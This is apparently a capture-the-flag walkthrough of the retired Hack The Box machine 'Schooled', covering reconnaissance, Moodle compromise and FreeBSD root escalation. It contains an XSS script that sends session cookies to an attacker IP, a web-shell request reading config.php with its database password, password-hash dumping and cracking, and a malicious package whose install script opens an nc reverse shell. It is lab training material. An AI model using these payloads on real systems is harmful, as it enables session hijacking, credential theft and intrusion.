---
layout: default
title: Schooled
description: Walkthrough for retired HTB box Schooled. Schooled is a Medium level box. In order to root it one must learn how to hijack sessions via XSS.
parent: Hack The Box
nav_order: 1
has_children: false
permalink: /htb/schooled
date: 2022-06-07
---
# Schooled Lab Report
![Screenshot 1](/assets/images/htb/schooled/banner.png)
FreeBSD

Moodle 3.9

## 1. Enumeration
### 1.1 NMAP

```
$ nmap -sS schooled.htb -p- --min-rate=1000 

Nmap scan report for schooled.htb
Host is up (0.23s latency).
Not shown: 62121 closed ports, 3411 filtered ports
PORT      STATE SERVICE
22/tcp    open  ssh
80/tcp    open  http
33060/tcp open  mysqlx
```

```
$ nmap -sV schooled.htb -p22,80,33060

Nmap scan report for schooled.htb
Host is up (0.24s latency).

PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 7.9 (FreeBSD 20200214; protocol 2.0)
80/tcp    open  http    Apache httpd 2.4.46 ((FreeBSD) PHP/7.4.15)
33060/tcp open  mysqlx?
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port33060-TCP:V=7.91%I=7%D=8/25%Time=61265124%P=aarch64-unknown-linux-g
SF:nu%r(NULL,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(GenericLines,9,"\x05\0\0\
SF:0\x0b\x08\x05\x1a\0")%r(GetRequest,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(
SF:HTTPOptions,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(RTSPRequest,9,"\x05\0\0
SF:\0\x0b\x08\x05\x1a\0")%r(RPCCheck,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(D
SF:NSVersionBindReqTCP,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(DNSStatusReques
SF:tTCP,2B,"\x05\0\0\0\x0b\x08\x05\x1a\0\x1e\0\0\0\x01\x08\x01\x10\x88'\x1
SF:a\x0fInvalid\x20message\"\x05HY000")%r(Help,9,"\x05\0\0\0\x0b\x08\x05\x
SF:1a\0")%r(SSLSessionReq,2B,"\x05\0\0\0\x0b\x08\x05\x1a\0\x1e\0\0\0\x01\x
SF:08\x01\x10\x88'\x1a\x0fInvalid\x20message\"\x05HY000")%r(TerminalServer
SF:Cookie,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(TLSSessionReq,2B,"\x05\0\0\0
SF:\x0b\x08\x05\x1a\0\x1e\0\0\0\x01\x08\x01\x10\x88'\x1a\x0fInvalid\x20mes
SF:sage\"\x05HY000")%r(Kerberos,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(SMBPro
SF:gNeg,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(X11Probe,2B,"\x05\0\0\0\x0b\x0
SF:8\x05\x1a\0\x1e\0\0\0\x01\x08\x01\x10\x88'\x1a\x0fInvalid\x20message\"\
SF:x05HY000")%r(FourOhFourRequest,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(LPDS
SF:tring,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(LDAPSearchReq,2B,"\x05\0\0\0\
SF:x0b\x08\x05\x1a\0\x1e\0\0\0\x01\x08\x01\x10\x88'\x1a\x0fInvalid\x20mess
SF:age\"\x05HY000")%r(LDAPBindReq,46,"\x05\0\0\0\x0b\x08\x05\x1a\x009\0\0\
SF:0\x01\x08\x01\x10\x88'\x1a\*Parse\x20error\x20unserializing\x20protobuf
SF:\x20message\"\x05HY000")%r(SIPOptions,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")
SF:%r(LANDesk-RC,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(TerminalServer,9,"\x0
SF:5\0\0\0\x0b\x08\x05\x1a\0")%r(NCP,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(N
SF:otesRPC,2B,"\x05\0\0\0\x0b\x08\x05\x1a\0\x1e\0\0\0\x01\x08\x01\x10\x88'
SF:\x1a\x0fInvalid\x20message\"\x05HY000")%r(JavaRMI,9,"\x05\0\0\0\x0b\x08
SF:\x05\x1a\0")%r(WMSRequest,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(oracle-tn
SF:s,32,"\x05\0\0\0\x0b\x08\x05\x1a\0%\0\0\0\x01\x08\x01\x10\x88'\x1a\x16I
SF:nvalid\x20message-frame\.\"\x05HY000")%r(ms-sql-s,9,"\x05\0\0\0\x0b\x08
SF:\x05\x1a\0")%r(afp,2B,"\x05\0\0\0\x0b\x08\x05\x1a\0\x1e\0\0\0\x01\x08\x
SF:01\x10\x88'\x1a\x0fInvalid\x20message\"\x05HY000");
Service Info: OS: FreeBSD; CPE: cpe:/o:freebsd:freebsd

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 33.18 seconds
```

### 1.2 Dirsearch 
```
$ python3 dirsearch.py -u http://schooled.htb

Time: Wed Aug 25 23:13:29 2021

301   231B   http://schooled.htb:80/js    -> REDIRECTS TO: http://schooled.htb/js/
403   199B   http://schooled.htb:80/.ht_wsr.txt
403   199B   http://schooled.htb:80/.htaccess.bak1
403   199B   http://schooled.htb:80/.htaccess.orig
403   199B   http://schooled.htb:80/.htaccess.sample
403   199B   http://schooled.htb:80/.htaccess.save
403   199B   http://schooled.htb:80/.htaccessBAK
403   199B   http://schooled.htb:80/.htaccessOLD
403   199B   http://schooled.htb:80/.htaccessOLD2
403   199B   http://schooled.htb:80/.htaccess_extra
403   199B   http://schooled.htb:80/.htaccess_orig
403   199B   http://schooled.htb:80/.htaccess_sc
403   199B   http://schooled.htb:80/.htm
403   199B   http://schooled.htb:80/.html
403   199B   http://schooled.htb:80/.htpasswds
403   199B   http://schooled.htb:80/.httr-oauth
403   199B   http://schooled.htb:80/.htpasswd_test
200    17KB  http://schooled.htb:80/about.html
200    11KB  http://schooled.htb:80/contact.html
301   232B   http://schooled.htb:80/css    -> REDIRECTS TO: http://schooled.htb/css/
301   234B   http://schooled.htb:80/fonts    -> REDIRECTS TO: http://schooled.htb/fonts/
301   235B   http://schooled.htb:80/images    -> REDIRECTS TO: http://schooled.htb/images/
200     2KB  http://schooled.htb:80/images/
200    20KB  http://schooled.htb:80/index.html
200   522B   http://schooled.htb:80/js/
```
### 1.3 Gobuster (Subdomain Discovery)
```
$ gobuster vhost -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt -u schooled.htb                                                            1 ⨯
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:          http://schooled.htb
[+] Threads:      10
[+] Wordlist:     /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt
[+] User Agent:   gobuster/3.0.1
[+] Timeout:      10s
===============================================================
2021/08/26 01:07:05 Starting gobuster
===============================================================
Found: moodle.schooled.htb (Status: 200) [Size: 84]
```
-> Add moodle.schooled.htb to /etc/hosts and access through browser.

## 2. Foothold
### 2.1 XSS to hijack teacher's session
1. Enroll yourself at Mathematics course
2. Add the following to your MoodleNetProfile
```
 <script>fetch('http://10.10.14.108/index.php?c='+document.cookie, {method: 'POST',mode: 'no-cors',body:document.cookie});</script>
```
3. Set up nginx and wait for connections (must have php-fpm)
4. Get teacher's session cookie at access.log
```
tail -f /var/log/nginx/access.log
```
5. Hijack teacher's cookie to through Cookies Quick Manager

### 2.2 RCE: CVE-2020-14321
<a href="https://github.com/HoangKien1020/CVE-2020-14321">https://github.com/HoangKien1020/CVE-2020-14321</a>

<a href="https://www.youtube.com/watch?v=BkEInFI4oIU">https://www.youtube.com/watch?v=BkEInFI4oIU</a>


- After getting backdoor, read /etc/passwd

```                                                 
root:*:0:0:Charlie &:/root:/bin/csh                                                                                                                                              
toor:*:0:0:Bourne-again Superuser:/root:                                                                                                                                         
daemon:*:1:1:Owner of many system processes:/root:/usr/sbin/nologin                                                                                                              
operator:*:2:5:System &:/:/usr/sbin/nologin                                                                                                                                      
bin:*:3:7:Binaries Commands and Source:/:/usr/sbin/nologin                                                                                                                       
tty:*:4:65533:Tty Sandbox:/:/usr/sbin/nologin                                                                                                                                    
kmem:*:5:65533:KMem Sandbox:/:/usr/sbin/nologin                                                                                                                                  
games:*:7:13:Games pseudo-user:/:/usr/sbin/nologin                                                                                                                               
news:*:8:8:News Subsystem:/:/usr/sbin/nologin                                                                                                                                    
man:*:9:9:Mister Man Pages:/usr/share/man:/usr/sbin/nologin                                                                                                                      
sshd:*:22:22:Secure Shell Daemon:/var/empty:/usr/sbin/nologin                                                                                                                    
smmsp:*:25:25:Sendmail Submission User:/var/spool/clientmqueue:/usr/sbin/nologin                                                                                                 
mailnull:*:26:26:Sendmail Default User:/var/spool/mqueue:/usr/sbin/nologin                                                                                                       
bind:*:53:53:Bind Sandbox:/:/usr/sbin/nologin                                                                                                                                    
unbound:*:59:59:Unbound DNS Resolver:/var/unbound:/usr/sbin/nologin                                                                                                              
proxy:*:62:62:Packet Filter pseudo-user:/nonexistent:/usr/sbin/nologin                                                                                                           
_pflogd:*:64:64:pflogd privsep user:/var/empty:/usr/sbin/nologin                                                                                                                 
_dhcp:*:65:65:dhcp programs:/var/empty:/usr/sbin/nologin                                                                                                                         
uucp:*:66:66:UUCP pseudo-user:/var/spool/uucppublic:/usr/local/libexec/uucp/uucico                                                                                               
pop:*:68:6:Post Office Owner:/nonexistent:/usr/sbin/nologin                                                                                                                      
auditdistd:*:78:77:Auditdistd unprivileged user:/var/empty:/usr/sbin/nologin                                                                                                     
www:*:80:80:World Wide Web Owner:/nonexistent:/usr/sbin/nologin                                                                                                                  
ntpd:*:123:123:NTP Daemon:/var/db/ntp:/usr/sbin/nologin                                                                                                                          
_ypldap:*:160:160:YP LDAP unprivileged user:/var/empty:/usr/sbin/nologin                                                                                                         
hast:*:845:845:HAST unprivileged user:/var/empty:/usr/sbin/nologin                                                                                                               
tests:*:977:977:Unprivileged user for tests:/nonexistent:/usr/sbin/nologin                                                                                                       
nobody:*:65534:65534:Unprivileged user:/nonexistent:/usr/sbin/nologin                                                                                                            
jamie:*:1001:1001:Jamie:/home/jamie:/bin/sh                                                                                                                                      
cyrus:*:60:60:the cyrus mail server:/nonexistent:/usr/sbin/nologin                                                                                                               
mysql:*:88:88:MySQL Daemon:/var/db/mysql:/usr/sbin/nologin                                                                                                                       
_tss:*:601:601:TCG Software Stack user:/var/empty:/usr/sbin/nologin                                                                                                              
messagebus:*:556:556:D-BUS Daemon User:/nonexistent:/usr/sbin/nologin                                                                                                            
avahi:*:558:558:Avahi Daemon User:/nonexistent:/usr/sbin/nologin                                                                                                                 
polkitd:*:565:565:Polkit Daemon User:/var/empty:/usr/sbin/nologin                                                                                                                
cups:*:193:193:Cups Owner:/nonexistent:/usr/sbin/nologin                                                                                                                         
colord:*:970:970:colord color management daemon:/nonexistent:/usr/sbin/nologin                                                                                                   
steve:*:1002:1002:User &:/home/steve:/bin/csh                                                                                                                                    ```
```
-> jamie or steve are our user accounts

- Read /usr/local/www/apache24/data/moodle/config.php

```
http://moodle.schooled.htb/moodle/blocks/rce/lang/en/block_rce.php?cmd=cat+/usr/local/www/apache24/data/moodle/config.php

<?php  // Moodle configuration file

unset($CFG);
global $CFG;
$CFG = new stdClass();

$CFG->dbtype    = 'mysqli';
$CFG->dblibrary = 'native';
$CFG->dbhost    = 'localhost';
$CFG->dbname    = 'moodle';
$CFG->dbuser    = 'moodle';
$CFG->dbpass    = 'PlaybookMaster2020';
$CFG->prefix    = 'mdl_';
$CFG->dboptions = array (
  'dbpersist' => 0,
  'dbport' => 3306,
  'dbsocket' => '',
  'dbcollation' => 'utf8_unicode_ci',
);

$CFG->wwwroot   = 'http://moodle.schooled.htb/moodle';
$CFG->dataroot  = '/usr/local/www/apache24/moodledata';
$CFG->admin     = 'admin';

$CFG->directorypermissions = 0777;

require_once(__DIR__ . '/lib/setup.php');

// There is no php closing tag in this file,
// it is intentional because it prevents trailing whitespace problems!
```
-> get mysql credentials

- Edit rce.zip to php_reverse_shell
- NetCat to RCE

```
nc -lvnp 1337
```

## 3. User
- Find mysql binary and login with creds found at config.php

```
/usr/local/bin/mysql -u moodle -p

use moodle;
select `firstname`, `lastname`, `username`, `password` from mdl_user;

firstname       lastname        username        password
Guest user              guest   $2y$10$u8DkSWjhZnQhBk1a0g1ug.x79uhkx/sa7euU8TI4FX4TCaXK6uQk2
Jamie   Borham  admin   $2y$10$3D/gznFHdpV6PXt1cLPhX.ViTgs87DCE5KqphQhGYR5GFbcl4qTiW
Oliver  Bell    bell_oliver89   $2y$10$N0feGGafBvl.g6LNBKXPVOpkvs8y/axSPyXb46HiFP3C9c42dhvgK
Sheila  Orchid  orchid_sheila89 $2y$10$YMsy0e4x4vKq7HxMsDk.OehnmAcc8tFa0lzj5b1Zc8IhqZx03aryC
Elizabeth       Chard   chard_ellzabeth89       $2y$10$D0Hu9XehYbTxNsf/uZrxXeRp/6pmT1/6A.Q2CZhbR26lCPtf68wUC
Jake    Morris  morris_jake89   $2y$10$UieCKjut2IMiglWqRCkSzerF.8AnR8NtOLFmDUcQa90lair7LndRy
James   Heel    heel_james89    $2y$10$sjk.jJKsfnLG4r5rYytMge4sJWj4ZY8xeWRIrepPJ8oWlynRc9Eim
Michael Nash    nash_michael89  $2y$10$yShrS/zCD1Uoy0JMZPCDB.saWGsPUrPyQZ4eAS50jGZUp8zsqF8tu
Rakesh  Singh   singh_rakesh89  $2y$10$Yd52KrjMGJwPUeDQRU7wNu6xjTMobTWq3eEzMWeA2KsfAPAcHSUPu
Marcus  Taint   taint_marcus89  $2y$10$kFO4L15Elng2Z2R4cCkbdOHyh5rKwnG4csQ0gWUeu2bJGt4Mxswoa
Shaun   Walls   walls_shaun89   $2y$10$EDXwQZ9Dp6UNHjAF.ZXY2uKV5NBjNBiLx/WnwHiQ87Dk90yZHf3ga
John    Smith   smith_john89    $2y$10$YRdwHxfstP0on0Yzd2jkNe/YE/9PDv/YC2aVtC97mz5RZnqsZ/5Em
Jack    White   white_jack89    $2y$10$PRy8LErZpSKT7YuSxlWntOWK/5LmSEPYLafDd13Nv36MxlT5yOZqK
Carl    Travis  travis_carl89   $2y$10$VO/MiMUhZGoZmWiY7jQxz.Gu8xeThHXCczYB0nYsZr7J5PZ95gj9S
Amy     Mac     mac_amy89       $2y$10$PgOU/KKquLGxowyzPCUsi.QRTUIrPETU7q1DEDv2Dt.xAjPlTGK3i
Boris   James   james_boris89   $2y$10$N4hGccQNNM9oWJOm2uy1LuN50EtVcba/1MgsQ9P/hcwErzAYUtzWq
Allan   Pierce  pierce_allan    $2y$10$ia9fKz9.arKUUBbaGo2FM.b7n/QU1WDAFRafgD6j7uXtzQxLyR3Zy
William Henry   henry_william89 $2y$10$qj67d57dL/XzjCgE0qD1i.ION66fK0TgwCFou9yT6jbR7pFRXHmIu
Zoe     Harper  harper_zoe89    $2y$10$mnYTPvYjDwQtQuZ9etlFmeiuIqTiYxVYkmruFIh4rWFkC3V1Y0zPy
Travis  Wright  wright_travis89 $2y$10$XFE/IKSMPg21lenhEfUoVemf4OrtLEL6w2kLIJdYceOOivRB7wnpm
Matthew Allen   allen_matthew89 $2y$10$kFYnbkwG.vqrorLlAz6hT.p0RqvBwZK2kiHT9v3SHGa8XTCKbwTZq
Wallis  Sanders sanders_wallis89        $2y$10$br9VzK6V17zJttyB8jK9Tub/1l2h7mgX1E3qcUbLL.GY.JtIBDG5u
Jane    Higgins higgins_jane    $2y$10$n9SrsMwmiU.egHN60RleAOauTK2XShvjsCS0tAR6m54hR1Bba6ni2
Manuel  Phillips        phillips_manuel $2y$10$ZwxEs65Q0gO8rN8zpVGU2eYDvAoVmWYYEhHBPovIHr8HZGBvEYEYG
Lianne  Carter  carter_lianne   $2y$10$jw.KgN/SIpG2MAKvW8qdiub67JD7STqIER1VeRvAH4fs/DPF57JZe
Dan     Parker  parker_dan89    $2y$10$MYvrCS5ykPXX0pjVuCGZOOPxgj.fiQAZXyufW5itreQEc2IB2.OSi
Tim     Parker  parker_tim89    $2y$10$YCYp8F91YdvY2QCg3Cl5r.jzYxMwkwEm/QBGYIs.apyeCeRD7OD6S
cptee   ctpee   cptee   $2y$10$DRqHMQgEj2QgHBoXUWLvWuWXw/racBQYHMB/jWJ2dVb4X.0H0z14.
lithium lithium lithium $2y$10$u06BdiH06t/Mt03qgSuRHeJ7lMPVBkjU2dtkguOujWSCDAgAnEti6
```
-> get jamie (admin) password hash

- John to break the Hash
```
john jamie_hash --wordlist=~/rockyou.txt
john --show jamie_hash
?:!QAZ2wsx
```

- SSH to User
```
ssh jamie@schooled.htb
```

## 4. Privesc
```
sudo -l

User jamie may run the following commands on Schooled:
    (ALL) NOPASSWD: /usr/sbin/pkg update
    (ALL) NOPASSWD: /usr/sbin/pkg install *
```

1. Tried to edit /etc/hosts and redirect pkg to a malicious repository with success, but failed.

2. created a custom pkg instead and installed it 

Custom pkg:

<a href="http://lastsummer.de/creating-custom-packages-on-freebsd/">http://lastsummer.de/creating-custom-packages-on-freebsd/</a>

<a href="https://github.com/freebsd/pkg#pkgfmt">https://github.com/freebsd/pkg#pkgfmt</a>


FreeBSD reverse shell:

<a href="https://sentrywhale.com/documentation/reverse-shell">https://sentrywhale.com/documentation/reverse-shell</a>


```
mkdir /tmp/foo
touch foo/+MANIFEST
```
+MANIFEST
```
name: foo
version: "1.0"
origin: category/foo
comment: this is foo package
arch: i386
www: http://www.foo.org
maintainer: foo@bar.org
prefix: /usr/local
licenselogic: or
licenses: [MIT, MPL]
flatsize: 482120
users: [USER1, USER2]
groups: [GROUP1, GROUP2]
options: { OPT1: off, OPT2: on }
desc: <<EOD
  This is the description
  Of foo
  
  A component of bar
EOD
categories: [bar, plop]
deps: {
}
files: {
}
directories: {
}
scripts: {
  post-install: <<EOD
    #!/bin/sh
    echo post-install
EOD
  pre-install: <<EOD
    #!/bin/sh
    echo pre-install
    rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i |nc 10.10.14.108 1337 > /tmp/f
EOD
}
```
- Netcat on Host

```
nc -lvnp 1337
```

- Install custom pkg on server

```
pkg -m /tmp/foo/ -r /tmp/foo/ -o .
sudo /usr/sbin/pkg --no-repo-update foo-1.0.txz
```

Done.